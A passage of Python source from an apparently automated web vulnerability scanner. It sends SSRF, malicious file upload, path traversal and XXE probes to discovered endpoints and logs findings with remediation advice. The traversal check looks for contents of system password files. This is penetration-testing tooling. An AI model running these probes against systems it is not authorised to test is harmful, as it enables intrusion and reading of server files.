                            if any(ind in content for ind in ssrf_indicators):
                                self._add_finding(
                                    category="A10",
                                    severity="critical",
                                    title=f"SSRF in {param}",
                                    description="Server-side request to attacker-controlled URL",
                                    url=url,
                                    method="POST",
                                    parameter=param,
                                    evidence=f"Payload: {payload}",
                                    remediation="Whitelist allowed URLs. Block internal IP ranges.",
                                    cwe_id="CWE-918"
                                )
                                break
                    except:
                        pass
    
    # ==================== File Upload Bypass ====================
    
    async def _test_file_upload_bypass(self, session: aiohttp.ClientSession):
        """Test for file upload vulnerabilities with bypass techniques"""
        logger.info("Testing for file upload bypass")
        
        upload_endpoints = [
            ep for ep in self.context.endpoints
            if any(x in ep.get('url', '').lower() for x in ['upload', 'file', 'image', 'avatar', 'photo', 'document', 'attachment'])
            and ep.get('method', '').upper() == 'POST'
        ]
        
        for endpoint in self.context.endpoints:
            if endpoint.get('has_upload'):
                upload_endpoints.append(endpoint)
        
        for endpoint in upload_endpoints[:10]:
            url = endpoint.get('url', '')
            
            for file_config in self.UPLOAD_BYPASS_FILES:
                try:
                    form_data = aiohttp.FormData()
                    form_data.add_field(
                        'file',
                        file_config['content'],
                        filename=file_config['name'],
                        content_type=file_config['content_type']
                    )
                    
                    async with session.post(url, data=form_data, timeout=aiohttp.ClientTimeout(total=15), ssl=False) as response:
                        content = await response.text()
                        resp_headers = dict(response.headers)
                        
                        if response.status in [200, 201]:
                            if 'success' in content.lower() or 'uploaded' in content.lower() or 'url' in content.lower():
                                self._add_finding(
                                    category="A05",
                                    severity="critical" if '.html' in file_config['name'] or '.php' in file_config['name'] else "high",
                                    title=f"File Upload Bypass: {file_config['name']}",
                                    description=f"Malicious file '{file_config['name']}' accepted by server",
                                    url=url,
                                    method="POST",
                                    evidence=f"File: {file_config['name']}, Content-Type: {file_config['content_type']}",
                                    remediation="Validate file type by content (magic bytes). Whitelist extensions. Store outside webroot.",
                                    cwe_id="CWE-434",
                                    poc=f"Upload file: {file_config['name']}\nContent: {file_config['content'][:50]}",
                                    reasoning=f"VERIFIED: Server accepted file '{file_config['name']}' with content-type '{file_config['content_type']}'",
                                    request_data=self._format_request("POST", url, self.headers, f"[Multipart: {file_config['name']}]"),
                                    response_data=self._format_response(response.status, resp_headers, content)
                                )
                                break
                except Exception as e:
                    logger.debug(f"File upload test failed: {e}")
            
            await asyncio.sleep(0.1)
    
    # ==================== Path Traversal ====================
    
    async def _test_path_traversal(self, session: aiohttp.ClientSession):
        """Test for path traversal vulnerabilities"""
        logger.info("Testing for path traversal")
        
        file_endpoints = [
            ep for ep in self.context.endpoints
            if any(x in ep.get('url', '').lower() for x in ['file', 'path', 'download', 'read', 'load', 'include', 'page', 'doc'])
        ]
        
        for endpoint in file_endpoints[:15]:
            url = endpoint.get('url', '')
            params = endpoint.get('params', {})
            
            path_params = [p for p in params if any(x in p.lower() for x in ['file', 'path', 'name', 'page', 'doc', 'template'])]
            
            for param in path_params or ['file', 'path', 'page']:
                for payload in self.PATH_TRAVERSAL_PAYLOADS[:3]:
                    try:
                        if '?' in url:
                            test_url = f"{url}&{param}={payload}"
                        else:
                            test_url = f"{url}?{param}={payload}"
                        
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                            content = await response.text()
                            
                            if 'root:' in content or 'root:x:' in content or '[boot loader]' in content.lower():
                                self._add_finding(
                                    category="A03",
                                    severity="critical",
                                    title=f"Path Traversal in {param}",
                                    description="Directory traversal allows reading system files",
                                    url=test_url,
                                    method="GET",
                                    parameter=param,
                                    evidence=f"Payload: {payload}",
                                    remediation="Validate and sanitize file paths. Use chroot or jail.",
                                    cwe_id="CWE-22"
                                )
                                break
                    except:
                        pass
    
    # ==================== XXE ====================
    
    async def _test_xxe(self, session: aiohttp.ClientSession):
        """Test for XML External Entity injection"""
        logger.info("Testing for XXE vulnerabilities")
        
        xml_endpoints = [
            ep for ep in self.context.endpoints
            if ep.get('method', '').upper() == 'POST' and
            any(x in ep.get('url', '').lower() for x in ['xml', 'soap', 'feed', 'rss', 'parse', 'import'])
        ]
        
        for endpoint in xml_endpoints[:5]:
            url = endpoint.get('url', '')
            
            for payload in self.XXE_PAYLOADS:
                try:
                    headers = {**self.headers, 'Content-Type': 'application/xml'}
                    
                    async with session.post(url, data=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                        content = await response.text()
                        
                        if 'root:' in content or 'xxe' in content.lower():
                            self._add_finding(
                                category="A03",
                                severity="critical",
                                title="XXE Injection",
                                description="XML parser processes external entities",
                                url=url,
                                method="POST",
                                evidence="External entity content in response",
                                remediation="Disable DTD and external entity processing in XML parser.",
                                cwe_id="CWE-611"
                            )
                            break
                except:
                    pass
    
    # ==================== AI-Powered Form Testing ====================
    
    async def _test_forms_with_ai(self, session: aiohttp.ClientSession):
        """Use AI to generate and test form data"""
        logger.info("Testing forms with AI-generated data")
        
        form_endpoints = [
            ep for ep in self.context.endpoints
            if ep.get('type') == 'form' or ep.get('method', '').upper() == 'POST'
        ]
        
        for endpoint in form_endpoints[:15]:
            url = endpoint.get('url', '')
            form_fields = endpoint.get('form_fields', [])
            
            if not form_fields:
                params = endpoint.get('params', {})
                form_fields = [{'name': k, 'type': 'text'} for k in params.keys()]
            
            if not form_fields:
                continue
            
            form_data = await self._generate_form_data_with_ai(form_fields)
            
            if form_data:
                try:
                    async with session.post(url, data=form_data, timeout=aiohttp.ClientTimeout(total=15), ssl=False) as response:
                        content = await response.text()
                        resp_headers = dict(response.headers)
                        
                        error_patterns = [
                            (r'sql syntax', 'SQL Error'),
                            (r'exception', 'Exception Details'),
                            (r'stack trace', 'Stack Trace'),
                            (r'debug', 'Debug Information'),
                        ]
                        
                        for pattern, error_type in error_patterns:
                            if re.search(pattern, content, re.IGNORECASE):
                                self._add_finding(
                                    category="A05",
                                    severity="medium",
                                    title=f"Verbose Error: {error_type}",
                                    description=f"Form submission revealed {error_type}",
                                    url=url,
                                    method="POST",
                                    evidence=f"AI-generated data triggered error disclosure",
                                    remediation="Implement proper error handling. Hide technical details.",
                                    cwe_id="CWE-209",
                                    request_data=self._format_request("POST", url, self.headers, json.dumps(form_data)),
                                    response_data=self._format_response(response.status, resp_headers, content)
                                )
                                break
                except:
                    pass
            
            await asyncio.sleep(0.1)
    
    def _add_finding(self, **kwargs):
        # Check if URL is in scope before adding finding
        url = kwargs.get('url', '')
        if url and not self._is_in_scope(url):
            logger.debug(f"Skipping out-of-scope finding: {url}")
            return
        
        self._finding_id += 1
        finding = ScanResult(id=f"POST-{self._finding_id:04d}", **kwargs)
        self.findings.append(finding)
        logger.info(f"Found: {finding.title}")


__all__ = [
    'PostLoginAttacks',
    # New Scanners Added 5 Jan 2026
    'PostLoginStoredXSSScanner',
    'PostLoginReflectedXSSScanner',
    'PostLoginPostMethodScanner',
]
